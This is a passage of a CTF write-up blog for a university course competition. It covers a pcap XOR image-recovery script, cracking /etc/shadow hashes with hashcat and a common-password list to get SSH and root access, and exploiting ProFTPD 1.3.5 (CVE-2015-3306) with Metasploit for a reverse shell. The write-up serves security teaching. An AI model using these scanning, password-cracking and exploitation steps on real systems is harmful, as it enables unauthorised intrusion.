href=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/images_0x2.pcap target=_blank rel="noopener noreferrer">Released file (pcap)</a></p><h4 id=solution-2 class=headerLink><a href=#solution-2 class=header-mark></a>Solution</h4><p>This challenge has no special scenario - just obviously wanting students to solve with coding XD
Similar approach to <a href=../nsysu-htcf-hw1/ rel>Hacking Attack & Defense hw_0x01 Writeup</a>, just different content to restore.</p><p>Packet challenge opening move <code>Follow > TCP Stream</code>, seeing <code>xor_key</code>, <code>image</code> means XOR restoring images. Direction should be clear, but scrolling shows 100+ images, so write code.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/01.png alt=" "></p><p>BTW, <code>xor_key</code> is base64 obfuscated - even decoded it&rsquo;s unreadable strings. TA intentionally prevented manual verification (though images are hard to manually restore anyway&mldr;).</p><p>Scapy tutorial referenced above, but note two scenarios when fetching Raw field data (as shown) - probably packets split due to length QQ. Condition judgment can use packet length or check data for keywords. Focus is on <code>xor_key</code>, <code>image</code> and&mldr; filename!! You&rsquo;ll know after writing XD</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/02.png alt=" "></p><p>Since data is concatenated, processing is tricky&mldr; <code>xor_key</code> and <code>image</code> can be split by <code>\r\n</code>, but filename needs <a href=https://regex101.com/ target=_blank rel="noopener noreferrer">Regular Expression</a>, or use fixed addresses (image lengths are actually the same XD). Rest should be clear from code :)</p><div class="code-block highlight is-closed show-line-numbers tw-group tw-my-2"><div class="tw-flex
tw-flex-row
tw-flex-1
tw-justify-between
tw-w-full tw-bg-bgColor-secondary"><button class="code-block-button
tw-mx-2
tw-flex
tw-flex-row
tw-flex-1" aria-hidden=true><div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon" viewBox="0 0 320 512"><path d="M285.476 272.971 91.132 467.314c-9.373 9.373-24.569 9.373-33.941.0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941.0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div><p class="tw-select-none !tw-my-1">python</p></button><div class=tw-flex><button class="line-number-button
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.show-line-numbers]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle line numbers"><svg class="icon" viewBox="0 0 512 512"><path d="M61.77 401l17.5-20.15a19.92 19.92.0 005.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 00-8 8v16a8 8 0 008 8h22.83a157.41 157.41.0 00-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33.0 15.94 2.44 15.94 9.09.0 4.72-4.2 8.22-14.36 8.22a41.54 41.54.0 01-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16.0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zm0-160H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16V80a16 16 0 00-16-16zm0 320H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zM16 160h64a8 8 0 008-8v-16a8 8 0 00-8-8H64V40a8 8 0 00-8-8H32a8 8 0 00-7.14 4.42l-8 16A8 8 0 0024 64h8v64H16a8 8 0 00-8 8v16a8 8 0 008 8zm-3.91 160H80a8 8 0 008-8v-16a8 8 0 00-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44.0-29.06-25-39.56-44.47-39.56-21.36.0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44.0 019.46-3.84c3.33.0 9.28 1.56 9.28 8.75C51 248.19.0 257.31.0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
<button class="wrap-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.is-wrap]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle code wrap"><svg class="icon" viewBox="0 0 448 512"><path d="M16 132h416c8.837.0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163.0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
<button class="copy-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
hover:tw-text-fgColor-link
print:!tw-hidden" title="Copy code">
<span class="copy-icon tw-block"><svg class="icon" viewBox="0 0 448 512"><path d="M433.941 65.941l-51.882-51.882A48 48 0 00348.118.0H176c-26.51.0-48 21.49-48 48v48H48c-26.51.0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51.0 48-21.49 48-48v-48h80c26.51.0 48-21.49 48-48V99.882a48 48 0 00-14.059-33.941zM266 464H54a6 6 0 01-6-6V150a6 6 0 016-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 01-6 6zm128-96H182a6 6 0 01-6-6V54a6 6 0 016-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 01-6 6zm6-256h-64V48h9.632c1.591.0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 011.757 4.243V112z"/></svg></span>
<span class="check-icon tw-hidden"><svg class="icon" viewBox="0 0 512 512"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206.0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204.0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204.0l36.203 36.204c9.997 9.997 9.997 26.206.0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
</button>
<button class="tw-select-none
tw-mx-2
tw-block
group-[.is-open]:tw-hidden
print:!tw-hidden" disabled aria-hidden=true><svg class="icon" viewBox="0 0 512 512"><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button></div></div><pre style=counter-reset:codeblock class="tw-block tw-m-0 tw-p-0"><code id=codeblock-id-2 class="chroma
!tw-block
tw-p-0
tw-m-0
tw-transition-[max-height]
tw-duration-500
tw-ease-in-out
group-[.is-closed]:!tw-max-h-0
group-[.is-wrap]:tw-text-wrap
tw-overflow-y-hidden
tw-overflow-x-auto
tw-scrollbar-thin"><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pkts</span> <span class=o>=</span> <span class=n>rdpcap</span><span class=p>(</span><span class=s1>&#39;images_0x2.pcap&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>pkts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>IP</span> <span class=ow>in</span> <span class=n>p</span> <span class=ow>and</span> <span class=n>p</span><span class=p>[</span><span class=n>IP</span><span class=p>]</span><span class=o>.</span><span class=n>dst</span> <span class=o>==</span> <span class=s1>&#39;140.117.169.219&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>Raw</span> <span class=ow>in</span> <span class=n>p</span> <span class=ow>and</span> <span class=sa>b</span><span class=s1>&#39;filename&#39;</span> <span class=ow>in</span> <span class=n>p</span><span class=p>[</span><span class=n>Raw</span><span class=p>]</span><span class=o>.</span><span class=n>load</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>raw</span> <span class=o>=</span> <span class=n>p</span><span class=p>[</span><span class=n>Raw</span><span class=p>]</span><span class=o>.</span><span class=n>load</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>filename</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;filename=&#34;(\w*.\w*)&#34;&#39;</span><span class=p>,</span> <span class=n>raw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>filename</span> <span class=o>=</span> <span class=n>filename</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>xor_key</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>raw</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>raw</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)[</span><span class=mi>7</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Use mod to repeat padding xor_key</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=p>[</span> <span class=n>word</span> <span class=o>^</span> <span class=n>xor_key</span><span class=p>[</span><span class=n>idx</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>xor_key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>word</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span> <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>img</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>res</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>close</span><span class=p>()</span></span></span></code></pre></div><p>Successfully dumping all images shows two filename types: 0-27 and timestamps. Just piece together the Flag!!
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png alt=" "></p><h2 id=pwn class=headerLink><a href=#pwn class=header-mark></a>Pwn</h2><h3 id=hashmeow-120-points-2-solves class=headerLink><a href=#hashmeow-120-points-2-solves class=header-mark></a>hashmeow (120 points, 2 solves)</h3><h4 id=description-3 class=headerLink><a href=#description-3 class=header-mark></a>Description</h4><p>macacahub.tw opened another port for ssh
Want to get the flag?
If you want it, you can have it all&mldr; go find it! I put all credentials in the files</p><div class="details admonition tip open"><div class="details-summary admonition-title"><span class=icon><svg class="icon" viewBox="0 0 352 512"><path d="M96.06 454.35c.01 6.29 1.87 12.45 5.36 17.69l17.09 25.69a31.99 31.99.0 0026.64 14.28h61.71a31.99 31.99.0 0026.64-14.28l17.09-25.69a31.989 31.989.0 005.36-17.69l.04-38.35H96.01l.05 38.35zM0 176c0 44.37 16.45 84.85 43.56 115.78 16.52 18.85 42.36 58.23 52.21 91.45.04.26.07.52.11.78h160.24c.04-.26.07-.51.11-.78 9.85-33.22 35.69-72.6 52.21-91.45C335.55 260.85 352 220.37 352 176 352 78.61 272.91-.3 175.45.0 73.44.31.0 82.97.0 176zm176-80c-44.11.0-80 35.89-80 80 0 8.84-7.16 16-16 16s-16-7.16-16-16c0-61.76 50.24-112 112-112 8.84.0 16 7.16 16 16s-7.16 16-16 16z"/></svg></span>Tip<span class=details-icon><svg class="icon" viewBox="0 0 256 512"><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9.0l-22.6-22.6c-9.4-9.4-9.4-24.6.0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6.0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9.0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span></div><div class=details-content><div class=admonition-content><p><strong>hint 1</strong>: Files came from the ssh service host</p><p><strong>hint 2</strong>: 10k-most-common.txt is useful</p><p><strong>hint 3</strong>: port_number > 1000 && port_number != 8778 && port_number != htcf.ports.port_number</p><p><strong>hint 4</strong>: flag is in a Linux directory with permission 1777</p><p><strong>hint 5</strong>: Luck is also skill</p></div></div></div><h4 id=solution-3 class=headerLink><a href=#solution-3 class=header-mark></a>Solution</h4><p>From htcf practice problems, port scanning starts with nmap - scanning domain for open port services (<code>-p-</code> equals <code>-p 0-65535</code>).</p><div class="code-block highlight is-open tw-group tw-my-2"><div class="tw-flex
tw-flex-row
tw-flex-1
tw-justify-between
tw-w-full tw-bg-bgColor-secondary"><button class="code-block-button
tw-mx-2
tw-flex
tw-flex-row
tw-flex-1" aria-hidden=true><div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon" viewBox="0 0 320 512"><path d="M285.476 272.971 91.132 467.314c-9.373 9.373-24.569 9.373-33.941.0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941.0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div><p class="tw-select-none !tw-my-1">bash</p></button><div class=tw-flex><button class="line-number-button
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.show-line-numbers]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle line numbers"><svg class="icon" viewBox="0 0 512 512"><path d="M61.77 401l17.5-20.15a19.92 19.92.0 005.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 00-8 8v16a8 8 0 008 8h22.83a157.41 157.41.0 00-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33.0 15.94 2.44 15.94 9.09.0 4.72-4.2 8.22-14.36 8.22a41.54 41.54.0 01-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16.0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zm0-160H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16V80a16 16 0 00-16-16zm0 320H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zM16 160h64a8 8 0 008-8v-16a8 8 0 00-8-8H64V40a8 8 0 00-8-8H32a8 8 0 00-7.14 4.42l-8 16A8 8 0 0024 64h8v64H16a8 8 0 00-8 8v16a8 8 0 008 8zm-3.91 160H80a8 8 0 008-8v-16a8 8 0 00-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44.0-29.06-25-39.56-44.47-39.56-21.36.0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44.0 019.46-3.84c3.33.0 9.28 1.56 9.28 8.75C51 248.19.0 257.31.0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
<button class="wrap-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.is-wrap]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle code wrap"><svg class="icon" viewBox="0 0 448 512"><path d="M16 132h416c8.837.0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163.0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
<button class="copy-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
hover:tw-text-fgColor-link
print:!tw-hidden" title="Copy code">
<span class="copy-icon tw-block"><svg class="icon" viewBox="0 0 448 512"><path d="M433.941 65.941l-51.882-51.882A48 48 0 00348.118.0H176c-26.51.0-48 21.49-48 48v48H48c-26.51.0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51.0 48-21.49 48-48v-48h80c26.51.0 48-21.49 48-48V99.882a48 48 0 00-14.059-33.941zM266 464H54a6 6 0 01-6-6V150a6 6 0 016-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 01-6 6zm128-96H182a6 6 0 01-6-6V54a6 6 0 016-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 01-6 6zm6-256h-64V48h9.632c1.591.0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 011.757 4.243V112z"/></svg></span>
<span class="check-icon tw-hidden"><svg class="icon" viewBox="0 0 512 512"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206.0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204.0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204.0l36.203 36.204c9.997 9.997 9.997 26.206.0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
</button>
<button class="tw-select-none
tw-mx-2
tw-block
group-[.is-open]:tw-hidden
print:!tw-hidden" disabled aria-hidden=true><svg class="icon" viewBox="0 0 512 512"><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button></div></div><pre style=counter-reset:codeblock class="tw-block tw-m-0 tw-p-0"><code id=codeblock-id-3 class="chroma
!tw-block
tw-p-0
tw-m-0
tw-transition-[max-height]
tw-duration-500
tw-ease-in-out
group-[.is-closed]:!tw-max-h-0
group-[.is-wrap]:tw-text-wrap
tw-overflow-y-hidden
tw-overflow-x-auto
tw-scrollbar-thin"><span class=line><span class=cl>$ nmap -p- macacahub.tw
</span></span><span class=line><span class=cl>$ nmap -sV -p <span class=m>55555</span> macacahub.tw</span></span></code></pre></div><p>From hint 3, target port is 55555. Using <code>-sV</code> shows ssh service (hint 1).</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png alt=" "></p><p>Found connection entry. Now we need ssh credentials.
Given passwd and shadow are password storage files, just hashed (see <a href=https://www.cyberciti.biz/faq/understanding-etcshadow-file/ target=_blank rel="noopener noreferrer">related article</a>). For details see <a href=http://linux.vbird.org/linux_basic/mandrake9/0410accountmanager.php target=_blank rel="noopener noreferrer">VBird&rsquo;s Linux - Account Management</a>. We need to crack the passwords!!</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png alt=" "></p><p>From hint 2, find dictionary <a href=https://github.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt target=_blank rel="noopener noreferrer">10k-most-common.txt</a> and download locally.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png alt=" "></p><p>Use <code>hashcat</code> password recovery tool - hashmeow hints at this XDDDD. See hashcat articles. Note shadow&rsquo;s $6$ means SHA-512, corresponding to <code>-m 1800</code>. Add <code>--show</code> at end or no results (lol). Using hashcat on shadow finds two passwords: root:root and shelly:shelly, truly <strong>weak passwords</strong>&mldr; that&rsquo;s hint 5.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png alt=" "></p><p>Next try logging in with shelly (normally nobody logs in directly as root, though this challenge also blocks root login).
Finally find the Flag inside. From hint 4, Googling shows 1777 permission is <code>/tmp</code> directory. See <a href=https://linux.vbird.org/linux_basic_train/centos7/unit05.php target=_blank rel="noopener noreferrer">VBird&rsquo;s Linux - Permission and Process Management</a>. Enter <code>/tmp</code>, find secret folder, easy Flag.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png alt=" "></p><h3 id=hashmeow-root-50-points-1-solve class=headerLink><a href=#hashmeow-root-50-points-1-solve class=header-mark></a>hashmeow root (50 points, 1 solve)</h3><h4 id=description-4 class=headerLink><a href=#description-4 class=header-mark></a>Description</h4><p>Same as hashmeow
But flag is in root&rsquo;s home</p><h4 id=solution-4 class=headerLink><a href=#solution-4 class=header-mark></a>Solution</h4><p>Continuing from above. Lower points because Flag is just in different folder XD
Go to root <code>/</code>. Moving to root directory per hint shows permission denied, even <code>sudo</code> doesn&rsquo;t work QQ. But a basic privilege escalation is <code>sudo su</code> - we can find <code>su</code> in <code>bin</code> directory and execute directly. Root password is root:root from hashcat earlier. Easy privilege escalation!!!</p><p>Just go to <code>/root</code>, get Flag!!</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png alt=" "></p><h3 id=proftpd-120-points-0-solve class=headerLink><a href=#proftpd-120-points-0-solve class=header-mark></a>ProFTPD (120 points, 0 solve)</h3><h4 id=description-5 class=headerLink><a href=#description-5 class=header-mark></a>Description</h4><p>There&rsquo;s an FTP server in the local network with a vulnerability (netmask 255.255.255.0, not the xxx.xxx.xxx.1 host)</p><p>First ssh remote connect to the attack host (same CTF platform credentials), then find the vulnerable host in the LAN, exploit it, and get the flag file under &ldquo;/var/www/html/_backup&rdquo;</p><p><code>ssh -p 8778 {your_account}@macacahub.tw</code></p><p><strong>hint</strong>: Recommend modifying default LPORT</p><h4 id=solution-5 class=headerLink><a href=#solution-5 class=header-mark></a>Solution</h4><p>After logging into &ldquo;attack host&rdquo;, per description we need to find vulnerable host in LAN (FTP Server hinted). Find current host IP, then nmap scan LAN.
For this challenge, IP is 172.30.0.3, so LAN scan uses <code>172.30.0.0/24</code> or <code>172.30.0.*</code>. Confirm FTP host exists then check version details. Aggressive approach: <code>nmap -A 172.30.0.0/24</code> lists all details.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png alt=" "></p><p>Found FTP Server version <code>ProFTPD 1.3.5</code>. Google reveals vulnerability <strong>CVE-2015-3306</strong>. Use class-taught Metasploit Framework to attack this vulnerability. Yes!! The &ldquo;attack host&rdquo; has tools pre-installed - use <code>msfconsole</code> to find vulnerability tools. If lazy to Google CVE, directly search <code>ProFTPD 1.3.5</code> in msf.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png alt=" "></p><p>Rest is tool usage - homework should teach basic operations XD
Parameters: RHOST target IP is 172.30.0.2 from nmap, SITEPATH is <code>/var/www/html/</code> from description (we can&rsquo;t access <code>_backup</code>). This challenge also needs payloads&mldr; not all work, needs some luck. But few options so trying all is fast.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png alt=" "></p><p>After setting payload, recheck options, add LHOST as &ldquo;attack host&rdquo; so reverse shell bounces back properly. Successful attack gets FTP Server shell, just extract flag. Done.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png alt=" "></p><div class="code-block highlight is-closed tw-group tw-my-2"><div class="tw-flex
tw-flex-row
tw-flex-1
tw-justify-between
tw-w-full tw-bg-bgColor-secondary"><button class="code-block-button
tw-mx-2
tw-flex
tw-flex-row
tw-flex-1" aria-hidden=true><div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon" viewBox="0 0 320 512"><path d="M285.476 272.971 91.132 467.314c-9.373 9.373-24.569 9.373-33.941.0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941.0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div><p class="tw-select-none !tw-my-1">bash</p></button><div class=tw-flex><button class="line-number-button
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.show-line-numbers]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle line numbers"><svg class="icon" viewBox="0 0 512 512"><path d="M61.77 401l17.5-20.15a19.92 19.92.0 005.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 00-8 8v16a8 8 0 008 8h22.83a157.41 157.41.0 00-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33.0 15.94 2.44 15.94 9.09.0 4.72-4.2 8.22-14.36 8.22a41.54 41.54.0 01-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16.0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zm0-160H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16V80a16 16 0 00-16-16zm0 320H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zM16 160h64a8 8 0 008-8v-16a8 8 0 00-8-8H64V40a8 8 0 00-8-8H32a8 8 0 00-7.14 4.42l-8 16A8 8 0 0024 64h8v64H16a8 8 0 00-8 8v16a8 8 0 008 8zm-3.91 160H80a8 8 0 008-8v-16a8 8 0 00-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44.0-29.06-25-39.56-44.47-39.56-21.36.0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44.0 019.46-3.84c3.33.0 9.28 1.56 9.28 8.75C51 248.19.0 257.31.0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
<button class="wrap-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.is-wrap]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle code wrap"><svg class="icon" viewBox="0 0 448 512"><path d="M16 132h416c8.837.0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163.0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
<button class="copy-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
hover:tw-text-fgColor-link
print:!tw-hidden" title="Copy code">
